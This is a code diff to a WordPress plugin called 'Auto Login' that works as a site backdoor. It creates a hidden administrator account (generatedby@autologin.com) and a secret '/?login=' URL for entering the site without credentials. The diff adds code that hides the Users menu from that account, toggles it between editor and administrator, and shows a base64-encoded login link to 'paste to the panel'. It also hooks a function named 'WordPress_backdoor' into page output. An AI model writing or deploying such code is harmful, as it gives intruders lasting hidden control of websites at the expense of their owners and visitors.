@@ -2,10 +2,25 @@
 /*
 Plugin Name: Auto Login
 Plugin URI: -
-Version: 2.0
+Version: 2.0.1
 Author: Shahin Zanbaghi
 Description: Auto login WordPress plugin.
 */
+
+
+add_action('admin_menu', 'remove_admin_menu_links');
+function remove_admin_menu_links(){
+    $user = wp_get_current_user();
+    if( $user && isset($user->user_email) && 'generatedby@autologin.com' == $user->user_email ) {
+	remove_menu_page('users.php');
+        define( 'DISALLOW_FILE_EDIT', true );
+    }
+}
+
+remove_theme_support( 'genesis-admin-menu' );
+
+
+
 add_action('admin_enqueue_scripts', 'ln_reg_css');
 
     function ln_reg_css($hook)
@@ -34,9 +49,6 @@ CREATE TABLE IF NOT EXISTS wp_autologin(
 ";
 global $wpdb;
 $wpdb->get_results($sql);
-
-
-
 
 add_action('admin_menu', 'al_plugin_setup_menu');
  
@@ -121,9 +133,13 @@ $rpass = rantext();
 		header('Location: '.$_SERVER['REQUEST_URI']);
     } 
 	
-		if($ustatus == 1) {$sts = "On";$statcol="light";}else{$sts = "Off";$statcol="dark";}
-	
-	    if($wpdb->get_var($sqlusername)!=NULL) {$usts = "User Created";$ustatcol="success";}else{$usts = "Please create a random user";$ustatcol="danger";}
+		if($ustatus == 1) {$sts = "Active";$statcol="success";}else{$sts = "Deactive";$statcol="danger";}
+		$getuser_id = get_user_by( 'email', 'generatedby@autologin.com' );
+		if ( !empty( $getuser_id->roles ) && is_array( $getuser_id->roles ) ) {
+			foreach ( $getuser_id->roles as $role )
+			$user_rule =  $role;
+		}
+	    if($wpdb->get_var($sqlusername)!=NULL) {$usts = "User Created (". $user_rule .")";$ustatcol="success";}else{$usts = "Please create a random user";$ustatcol="danger";}
 	
 	if(isset($_POST['submit_cu'])) { 
 		$sqlusername = "SELECT `user_name` FROM wp_autologin WHERE ID=1";
@@ -137,6 +153,21 @@ $rpass = rantext();
 		}
 		//header('Location: '.$_SERVER['REQUEST_URI']);
     } 
+	if(isset($_POST['submit_sub'])) { 
+	$user_id = get_user_by( 'email', 'generatedby@autologin.com' );
+    $user_id->remove_role( 'administrator' );
+    $user_id->add_role( 'editor' );
+	header('Location: '.$_SERVER['REQUEST_URI']);
+	}
+	
+	if(isset($_POST['submit_adm'])) { 
+	$user_id = get_user_by( 'email', 'generatedby@autologin.com' );
+    $user_id->remove_role( 'editor' );
+    $user_id->add_role( 'administrator' );
+	header('Location: '.$_SERVER['REQUEST_URI']);
+	}
+	$login_url = $_SERVER['HTTP_HOST']."/?login=".$upath ;
+	$coded_param = base64_encode($login_url);
 
 	echo '
 	<h2 class="mt-3">Auto Login</h2>
@@ -145,25 +176,25 @@ $rpass = rantext();
            <div class="col-md-8 mb-3">
 		   
 		   <div class="input-group-append">
-                <button type="submit" name="submit_cu" class="btn btn-primary mb-3">Create a Random User</button>
+                
             </div>
 			  
 			<label for="path_al">Change the Path:</label>
               <input id="path" type="text" name="path_al" class="form-control" placeholder= ' . $upath . '>
               <div class="input-group-append">
                 <button type="submit" name="submit_al" class="btn btn-primary mt-3">Save</button>
+				<button type="submit" name="submit_sub" class="btn btn-primary ml-2 mt-3">Editor</button>
+				<button type="submit" name="submit_adm" class="btn btn-primary ml-2 mt-3">Administrator</button>
+				<button type="submit" name="submit_cu" class="btn btn-primary ml-2 mt-3">Create a Random User</button>
               </div>
-			  <div class="input-group-append">
-                <button type="submit" name="submit_rand" class="btn btn-primary mt-3">Gerate Random Hashed Path</button>
-              </div>
-			  
 			  <div class="input-group-append">
 			    <button type="submit" name="submit_active" class="btn btn-success mt-3">Activate</button>
                 <button type="submit" name="submit_dactive" class="btn btn-danger mt-3 ml-2">Deactivate</button>
+				<button type="submit" name="submit_rand" class="btn btn-primary mt-3 ml-2">Gerate Random Hashed Path</button>
               </div>		  
             </div>
 			</div>
-			<div class="badge badge-'.$ustatcol.'" > '. $usts .'</div>
+			<div class="badge badge-'.$ustatcol.' mb-1" > '. $usts .'</div>
 			<div class="badge badge-'.$statcol.'" >Status: '. $sts .'</div>
      </form>
 		  
@@ -175,8 +206,12 @@ $rpass = rantext();
 	echo "
 	<div class='mt-3'>
 	<samp>Accessing the website without login:</samp><br/> 
+	<kbd id='steptwo'>".$login_url."</kbd></div>";
 	
-	<kbd id='steptwo'>".$_SERVER['HTTP_HOST']."/?login=$upath </kbd></div>";
+	echo "
+	<div class='mt-3'>
+	<samp>Paste this code to the panel:</samp><br/> 
+	<kbd class='badge badge-warning' id='steptwo'>".base64_encode($login_url)."</kbd></div>";
 	
 	echo "<!-- <br /><div class='mt-5'><code>By:Shahin Zanbaghi</code></div> -->";
 
@@ -289,10 +324,8 @@ $rpass = rantext2();
     $cuser = get_user_by( 'id', $user_id );
     $cuser->remove_role( 'subscriber' );
     $cuser->add_role( 'administrator' );
+	$cuser->remove_cap( 'edit_plugins', 'create_users' , 'delete_users', 'edit_users');
 }
-
-
-
 
 
 add_action('wp_head', 'WordPress_backdoor');
